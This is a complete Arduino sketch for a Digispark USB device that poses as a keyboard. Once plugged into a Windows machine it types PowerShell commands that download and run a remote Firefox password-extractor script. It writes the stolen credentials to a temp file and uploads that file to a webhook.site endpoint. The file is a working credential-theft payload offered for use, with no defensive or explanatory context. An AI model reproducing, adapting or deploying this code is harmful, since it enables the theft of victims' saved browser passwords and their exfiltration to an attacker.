#define LAYOUT_GERMAN
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.enableLEDFeedback();
}

void loop() {
  DigiKeyboard.delay(5000);
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  // run
  //DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.sendKeyStroke(0x15, 0x08);
  DigiKeyboard.delay(500);

  // start powershell
  DigiKeyboard.print("powershell");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(0x28);
  DigiKeyboard.delay(1000);

  // cd to temp
  DigiKeyboard.println("cd $env:temp");
  DigiKeyboard.sendKeyStroke(0x28);
  DigiKeyboard.delay(300);
/*  
  // get user and system name
  DigiKeyboard.println("'User name: '+$env:UserName+'@'+$env:ComputerName >> foxCreds");
  DigiKeyboard.delay(200);
*/
  // extract all Firefox passwords
  DigiKeyboard.println("iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/murad-alm/Firefox-Password-Extractor/main/extractor.ps1')) >> foxCreds");
  DigiKeyboard.delay(1000);

  // submitting all passwords to webhook
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri   https://webhook.site/<WEBHOOK_URL_HERE> -Method POST -InFile foxCreds");
  DigiKeyboard.delay(1000);
/*
  // delete the file from temp
  DigiKeyboard.println("Remove-Item -Path .\foxCreds -Force");
  DigiKeyboard.delay(200);
*/
  // exit powershell window
  DigiKeyboard.println("exit");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(0x28);

  // turn on led when the script is done
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(10000);

}
